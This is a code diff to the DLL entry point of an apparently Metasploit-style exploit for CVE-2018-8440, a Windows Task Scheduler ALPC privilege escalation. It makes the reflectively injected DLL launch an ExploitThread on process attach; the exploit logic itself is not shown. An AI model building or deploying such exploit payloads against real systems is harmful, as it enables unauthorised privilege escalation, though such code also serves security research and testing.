+++ external/source/exploits/CVE-2018-8440/ALPC-TaskSched-LPE/dllmain.cpp
@@ -1,8 +1,9 @@
+#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
+
 //===============================================================================================//
 // This is a stub for the actuall functionality of the DLL.
 //===============================================================================================//
-#include "ReflectiveLoader.h"
-#include "exploit.h"
+#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
 
 // Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
 // defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
@@ -11,25 +12,26 @@
 // You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
 extern HINSTANCE hAppInstance;
 //===============================================================================================//
-BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
+#include "stdafx.h"
+#include "Header.h"
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 {
-    BOOL bReturnValue = TRUE;
-	switch( dwReason ) 
-    { 
-		case DLL_QUERY_HMODULE:
-			if( lpReserved != NULL )
-				*(HMODULE *)lpReserved = hAppInstance;
-			break;
-		case DLL_PROCESS_ATTACH:
-			hAppInstance = hinstDLL;
-			MessageBoxA( NULL, "Hello from DllMain!", "Reflective Dll Injection", MB_OK );
-			testFunc();
-			//RunIt((void*)hAppInstance);
-			break;
-		case DLL_PROCESS_DETACH:
-		case DLL_THREAD_ATTACH:
-		case DLL_THREAD_DETACH:
-            break;
-    }
+	BOOL bReturnValue = TRUE;
+	switch (dwReason)
+	{
+	case DLL_QUERY_HMODULE:
+		if (lpReserved != NULL)
+			*(HMODULE *)lpReserved = hAppInstance;
+		break;
+	case DLL_PROCESS_ATTACH:
+		hAppInstance = hinstDLL;
+		MessageBox(0, L"In DLLMain", L"Status", MB_OK);
+		CreateThread(NULL, 0, ExploitThread, hinstDLL, 0, NULL);
+		break;
+	case DLL_PROCESS_DETACH:
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+		break;
+	}
 	return bReturnValue;
 }
